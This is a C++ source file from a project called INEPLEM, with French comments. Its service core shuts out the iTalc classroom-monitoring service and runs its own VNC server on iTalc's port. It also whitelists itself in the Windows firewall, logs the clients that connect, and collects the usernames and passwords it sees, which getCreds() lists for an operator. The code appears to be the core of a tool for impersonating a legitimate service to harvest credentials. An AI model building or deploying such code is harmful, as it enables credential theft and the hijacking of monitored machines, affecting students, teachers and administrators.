// Copyright: 2019 redoste
/*
*	This file is part of INEPLEM.
*
*	INEPLEM is free software: you can redistribute it and/or modify
*	it under the terms of the GNU General Public License as published by
*	the Free Software Foundation, either version 3 of the License, or
*	(at your option) any later version.
*
*	INEPLEM is distributed in the hope that it will be useful,
*	but WITHOUT ANY WARRANTY; without even the implied warranty of
*	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*	GNU General Public License for more details.
*
*	You should have received a copy of the GNU General Public License
*	along with INEPLEM.  If not, see <https://www.gnu.org/licenses/>.
*/
#include <iostream>
#include <map>
#include <string>
#include <Windows.h>
#include <FreeImageLite.h>

#include "serviceCore.h"
#include "watchdog.h"
#include "net.h"
#include "vncServer.h"
#include "serviceToUi.h"

/* ServiceCore::ServiceCore: Constructeur qui initialise toutes les valeurs
 */
ServiceCore::ServiceCore(){
	this->m_italcUsername = std::string("");
	this->m_italcUsernameNull = 1;
	this->m_italcAuthtype = VNC_MSAUTH;
	this->m_italcAuthresponse = VNC_REJECT;
	this->m_italcSleep = 0;
	this->m_framesDelay = 60000;
	this->m_framesLock = 0;
}

/* ServiceCore::start: Démare les différents composant du service
 * Aucun parramètre et aucun retour
 */
void ServiceCore::start(){
	std::cout << "[ServiceCore] Starting..." << std::endl;
	// On initialise la stack réseau de window
	initWSocket();
	// On initialise FreeImage
	FreeImage_Initialise();

	// On démare le watchdog Italc
	this->m_watchdogThread = italcWatchdogThread(this);

	// On se whitelist dans le firewall
	whitelistFirewall();
	std::cout << "[ServiceCore] Firewall configured" << std::endl;

	// On attend que Italc soit arrêté
	while(this->m_italcSleep == 0) Sleep(50);

	// On démarre le serveur VNC
	this->m_vncServer = new VncServer(ITALC_PORT, this);
	this->m_vncServer->startThread();

	// On démare la connection vers l'UI
	this->m_serviceToUi = new ServiceToUi(this);
	this->m_serviceToUi->startAcceptingThread();
}

/* ServiceCore::stop: Arrête les différents composant du service
 * Aucun parramètre et aucun retour
 */
void ServiceCore::stop(){
	std::cout << "[ServiceCore] Stopping..." << std::endl;
	// On arrète le watchdog Italc
	CloseHandle(this->m_watchdogThread);

	// On arrête le serveur VNC
	this->m_vncServer->stopThread();
	delete this->m_vncServer;

	// On arrête la connection vers l'Ui
	this->m_serviceToUi->stopAcceptingThread();
	delete this->m_serviceToUi;

	// On arrête FreeImage
	FreeImage_DeInitialise();
}

/* ServiceCore::italcSleep: Est appelée par le watchdog lorsque ITalc est arrêté
 * Aucun paramètre ni retour
 */
void ServiceCore::italcSleep(){
	this->m_italcSleep = 1;
}

/* ServiceCore::kill: Est appelée en cas d'erreur fatale et tue l'intégralité d'INEPLEM
 * Aucun paramètre ni retour
 */
void ServiceCore::kill(){
	this->stop();
	exit(1);
}

/* ServiceCore::status: Ecris un message de status pour l'UI
 * retourne une std::string: Le message de status
 */
std::string ServiceCore::status(){
	std::string outputText("");
	outputText += "Status:";
	outputText += "\n";

	outputText += "Auth type: ";
	if(this->m_italcAuthtype == VNC_MSAUTH){ outputText += "MS Auth II\n"; }
	else if(this->m_italcAuthtype == VNC_NONEAUTH) { outputText += "None\n"; }
	else{ outputText += "UNKNOWN\n"; }

	outputText += "Auth response: ";
	outputText += std::to_string(this->m_italcAuthresponse);
	outputText += "\n";

	outputText += "Username: \"" + this->m_italcUsername + "\"\n\n";

	outputText += "Seen clients:\n";
	for(std::map<std::string, uint16_t>::iterator i = this->m_clientsSeen.begin(); i != this->m_clientsSeen.end(); i++){
		outputText += "    " + i->first + " : " + std::to_string(i->second) + "\n";
	}
	outputText += "\n";

	outputText += "(c) 2019 eef784f1ff9aae654805f0f674bbabec7ae5f6a9\n";
	return outputText;
}

/* ServiceCore::clientSeen: Marque que un client s'est connecté dans m_clientsSeen
 * std::string address: Addresse du client
 */
void ServiceCore::clientSeen(std::string address){
	// On verifie si il est déjà dans la liste de manière a incrémenter son compteur
	std::map<std::string, uint16_t>::iterator i = this->m_clientsSeen.find(address);
	if(i == this->m_clientsSeen.end()){
		this->m_clientsSeen[address] = 1;
	}
	else{
		if(this->m_clientsSeen[address] < 65535){
			this->m_clientsSeen[address] += 1;
		}
	}
}

/* ServiceCore::getCreds: Ecris un message contenant les creds pour l'UI
 * retourne une std::string: Le message
 */
std::string ServiceCore::getCreds(){
	std::string outputText("");
	outputText += "Creds:\n";
	outputText += "    USERNAME => PASSWORD\n";
	for(std::map<std::string, std::string>::iterator i = this->m_credsSeen.begin(); i != this->m_credsSeen.end(); i++){
		outputText += "    " + i->first + " => " + i->second + "\n";
	}
	return outputText;
}